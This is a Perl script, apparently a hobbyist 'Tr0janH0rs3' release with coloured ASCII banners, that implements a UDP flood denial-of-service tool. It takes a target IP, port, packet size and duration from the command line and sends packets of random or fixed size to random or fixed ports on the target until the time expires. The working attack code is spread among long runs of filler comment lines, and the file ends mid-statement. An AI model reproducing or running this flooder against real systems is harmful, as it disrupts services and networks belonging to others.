#!/usr/bin/perl
#########################
# Design By Tr0janH0rs3 #
#        2020           #
#########################
#
#
#
# PLEASE DO NOT COPY MY CODE!
# ITS NOT COOL
#
# PLEASE DO NOT COPY MY CODE!
# ITS NOT COOL
#
# PLEASE DO NOT COPY MY CODE!
# ITS NOT COOL
#
# PLEASE DO NOT COPY MY CODE!
# ITS NOT COOL
#
# PLEASE DO NOT COPY MY CODE!
# ITS NOT COOL
#
# PLEASE DO NOT COPY MY CODE!
# ITS NOT COOL
#
# PLEASE DO NOT COPY MY CODE!
# ITS NOT COOL
#
# PLEASE DO NOT COPY MY CODE!
# ITS NOT COOL
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
use if 'MSWin32' eq $^O, 'Win32::Console::ANSI';
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#

#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#########
#
#
##########
#########################
#
#####################################
#
######################
#
#
##################################
#
#
#
#########################################
#
#
#
####################
#
#
#############################
#
#
####################
#
#
######################
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
use Term::ANSIColor qw(:constants);

#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
use Socket;
use strict;

my ($ip,$port,$size,$time) = @ARGV;

my ($iaddr,$endtime,$psize,$pport);

$iaddr = inet_aton("$ip") or die "Wrong ip $ip\n";
$endtime = time() + ($time ? $time : 100);
socket(flood, PF_INET, SOCK_DGRAM, 17);
#
#
#
# PLEASE DO NOT COPY MY CODE!
# ITS NOT COOL
#
# PLEASE DO NOT COPY MY CODE!
# ITS NOT COOL
#
# PLEASE DO NOT COPY MY CODE!
# ITS NOT COOL
#
# PLEASE DO NOT COPY MY CODE!
# ITS NOT COOL
#
# PLEASE DO NOT COPY MY CODE!
# ITS NOT COOL
#
# PLEASE DO NOT COPY MY CODE!
# ITS NOT COOL
#
# PLEASE DO NOT COPY MY CODE!
# ITS NOT COOL
#
#
#
print BRIGHT_YELLOW ON_BLACK <<EOTEXT;









                                          *_______________*
                                          [  VERSION 5.0  ]
                                          < GOLD  EDITION >
                                          `````````````````
										  
EOTEXT
#
#
#
#
#
#
#
#ASCII TEXT
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
print BRIGHT_RED ON_BLACK <<EOTEXT;							  
  ===============================================================================================
  = d888888b d8888b.  .d88b.     d88b  .d8b.  d8b   db db   db  .d88b.  d8888b. .d8888. d8888b. =  
 == `~~88~~' 88  `8D .8P  88.    `8P' d8' `8b 888o  88 88   88 .8P  88. 88  `8D 88'  YP VP  `8D ==
===    88    88oobY' 88  d'88     88  88ooo88 88V8o 88 88ooo88 88  d'88 88oobY' `8bo.     oooY' ===
===    88    88`8b   88 d' 88     88  88~~~88 88 V8o88 88~~~88 88 d' 88 88`8b     `Y8b.   ~~~b. ===
 ==    88    88 `88. `88  d8' db. 88  88   88 88  V888 88   88 `88  d8' 88 `88. db   8D db   8D ==
  =    YP    88   YD  `Y88P'  Y8888P  YP   YP VP   V8P YP   YP  `Y88P'  88   YD `8888Y' Y8888P' =
  ===============================================================================================
EOTEXT
print BRIGHT_BLUE ON_BLACK <<EOTEXT;
                                         (-==Perl Script==-)
EOTEXT
print BRIGHT_WHITE ON_BLACK <<EOTEXT;								 
		                         
	                                 [Stop with Ctrl-C]						     
								   
								   
								   
								   
								   
								   
EOTEXT
#
# TEXT IP, PORT & BYTES
#
print "IP= $ip " . ($port ? $port : "Random") . " Bytes= " .
#
#
#
#
#
#

#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
####################################################################
#
########################
#
#
#
#######################
###################
#
##############
###################
#
#
#
#
###########
#
#
##########################
################
################
################
##############################
##################
###############################
##
####################
#
###############################
#
#
###############################
#
##################################
###############
#
##############
#
#
######################
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#$FILE packetX10.
#share $packetX10
#
#
#
#
#
#
#
#
#
#
#
#
#
#
  ($size ? "$size" : "Disconnected!") .
#
#
#
#
#
#
#
#
#
#
#
#
#
#
  ($time ? " for $time seconds" : "") . "\n";
###################
###############
##############
#
#
#############
##################
#
#
###############
############################
#
#####
################
######################
###################
################
###############
#
#############
#
####################
#
#
#
#
#
#
#
print "Stop with Ctrl-C\n" unless $time;
#
#
###########
#
########
####
##
#############
#
#
#
# PACKETS AND PORT
for (;time() <= $endtime;) {
#
#
#
#
#
#
#
#
#
#
#
#
#
#
  $psize = $size ? $size : int(rand(6143-64)+64) ;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  #MADE BY TR0JANH0RS3
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
#
  $pport = $port ? $port : int(rand(1500000))+1;

#
#
#
#
#
#
#
#
#
  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          #MADE BY TR0JANH0RS3#MADE BY TR0JANH0RS3#MADE BY TR0JANH0RS3#MADE BY TR0JANH0RS3#MADE BY TR0JANH0RS3#MADE BY TR0JANH0RS3#MADE BY TR0JANH0RS3
#
#
#
#
#
#
#
#
#
#
#
#
#
#
print BRIGHT_WHITE ON_BLACK 